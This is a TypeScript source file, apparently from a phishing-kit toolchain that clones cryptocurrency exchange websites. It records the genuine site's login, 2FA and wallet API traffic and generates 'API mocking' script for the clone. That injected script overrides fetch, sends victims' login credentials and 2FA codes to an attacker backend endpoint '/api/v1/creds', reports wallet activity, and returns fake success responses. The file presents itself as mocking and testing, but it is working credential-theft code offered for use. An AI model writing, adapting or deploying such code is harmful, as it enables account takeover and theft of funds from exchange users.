/**
 * API Response Capture & Mocking
 *
 * Monitors API calls and responses, captures their format,
 * and generates realistic mock responses for the clone.
 */

import type { Page } from 'puppeteer'
import { writeFile, mkdir } from 'node:fs/promises'
import path from 'node:path'

export interface ApiCall {
  method: string
  endpoint: string
  requestBody?: Record<string, unknown>
  responseStatus: number
  responseBody: Record<string, unknown> | string
  timestamp: number
  headers: Record<string, string>
}

export interface CapturedApiResponses {
  login: ApiCall[]
  twofa: ApiCall[]
  walletConnect: ApiCall[]
  transactions: ApiCall[]
  balances: ApiCall[]
  other: ApiCall[]
}

export async function captureApiResponses(page: Page, outputDir: string): Promise<CapturedApiResponses> {
  console.info('[API-CAPTURE] Starting API monitoring...')

  const captured: CapturedApiResponses = {
    login: [],
    twofa: [],
    walletConnect: [],
    transactions: [],
    balances: [],
    other: [],
  }

  // Intercept and log fetch requests
  await page.on('response', async (response) => {
    const request = response.request()
    const method = request.method()
    const url = request.url()

    try {
      let body: Record<string, unknown> | string = ''
      try {
        const text = await response.text()
        body = JSON.parse(text)
      } catch (e) {
        body = ''
      }

      const call: ApiCall = {
        method,
        endpoint: url,
        responseStatus: response.status(),
        responseBody: body,
        timestamp: Date.now(),
        headers: response.headers() as Record<string, string>,
      }

      // Categorize
      if (url.includes('login') || url.includes('auth')) {
        captured.login.push(call)
      } else if (url.includes('2fa') || url.includes('otp') || url.includes('totp')) {
        captured.twofa.push(call)
      } else if (url.includes('wallet') || url.includes('connect')) {
        captured.walletConnect.push(call)
      } else if (url.includes('transaction') || url.includes('send')) {
        captured.transactions.push(call)
      } else if (url.includes('balance') || url.includes('portfolio')) {
        captured.balances.push(call)
      } else {
        captured.other.push(call)
      }
    } catch (e) {
      console.warn('[API-CAPTURE] Failed to capture response:', e instanceof Error ? e.message : String(e))
    }
  })

  console.info('[API-CAPTURE] Monitoring active')
  return captured
}

export function buildApiMockingCode(captured: CapturedApiResponses, backendUrl: string): string {
  return `
<script>
// Auto-generated API response mocking
(function() {
  var BACKEND_URL = '${backendUrl}';
  var CAPTURED_RESPONSES = ${JSON.stringify(captured)};

  // Override fetch to intercept API calls
  var originalFetch = window.fetch;
  window.fetch = function() {
    var args = Array.from(arguments);
    var url = args[0];
    var options = args[1] || {};

    // Check if this is a login API call
    if (typeof url === 'string' && url.includes('login')) {
      console.log('[API-MOCK] Intercepting login call');

      // Send to our backend
      var body = options.body;
      if (body && typeof body === 'string') {
        try {
          var parsed = JSON.parse(body);
          fetch(BACKEND_URL + '/api/v1/creds', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              exchange: window.location.hostname,
              ...parsed,
            }),
            keepalive: true,
          });
        } catch(e) {}
      }

      // Return mock successful response
      return Promise.resolve(new Response(JSON.stringify({
        status: 'success',
        message: 'Login successful',
        token: 'mock_token_' + Math.random().toString(36).substr(2, 9),
        requires_2fa: true,
      }), { status: 200 }));
    }

    // Check if 2FA call
    if (typeof url === 'string' && (url.includes('2fa') || url.includes('verify'))) {
      console.log('[API-MOCK] Intercepting 2FA call');

      var body = options.body;
      if (body && typeof body === 'string') {
        try {
          var parsed = JSON.parse(body);
          fetch(BACKEND_URL + '/api/v1/creds', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              exchange: window.location.hostname,
              type: 'two_fa',
              ...parsed,
            }),
            keepalive: true,
          });
        } catch(e) {}
      }

      // Return mock verification successful
      return Promise.resolve(new Response(JSON.stringify({
        status: 'success',
        message: '2FA verified',
        token: 'verified_token_' + Math.random().toString(36).substr(2, 9),
      }), { status: 200 }));
    }

    // For wallet connect calls
    if (typeof url === 'string' && url.includes('wallet')) {
      // Let through but also send to our backend
      fetch(BACKEND_URL + '/api/v1/wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          exchange: window.location.hostname,
          page_url: window.location.href,
        }),
        keepalive: true,
      });
    }

    // Default: use original fetch
    return originalFetch.apply(this, arguments);
  };

  console.log('[API-MOCK] API mocking enabled');
})();
</script>
`
}

export async function saveApiResponses(captured: CapturedApiResponses, outputDir: string): Promise<void> {
  await mkdir(outputDir, { recursive: true })

  const report = {
    captured: {
      login: captured.login.length,
      twofa: captured.twofa.length,
      walletConnect: captured.walletConnect.length,
      transactions: captured.transactions.length,
      balances: captured.balances.length,
      other: captured.other.length,
    },
    total: Object.values(captured).reduce((sum, arr) => sum + arr.length, 0),
    responses: captured,
  }

  await writeFile(path.join(outputDir, 'api-responses.json'), JSON.stringify(report, null, 2), 'utf8')

  console.info('[API-CAPTURE] Responses saved to api-responses.json')
}

export function generateApiTestCode(captured: CapturedApiResponses): string {
  return `
// Auto-generated API testing code
var CAPTURED_APIS = ${JSON.stringify({
    login: captured.login.length,
    twofa: captured.twofa.length,
    walletConnect: captured.walletConnect.length,
    transactions: captured.transactions.length,
    balances: captured.balances.length,
  })};

function testApiResponses() {
  var tests = [];

  // Test login API
  if (CAPTURED_APIS.login > 0) {
    tests.push({
      name: 'Login API',
      status: 'captured',
      count: CAPTURED_APIS.login,
    });
  }

  // Test 2FA API
  if (CAPTURED_APIS.twofa > 0) {
    tests.push({
      name: '2FA API',
      status: 'captured',
      count: CAPTURED_APIS.twofa,
    });
  }

  // Test wallet connect API
  if (CAPTURED_APIS.walletConnect > 0) {
    tests.push({
      name: 'Wallet Connect API',
      status: 'captured',
      count: CAPTURED_APIS.walletConnect,
    });
  }

  console.table(tests);
  return tests;
}
`
}
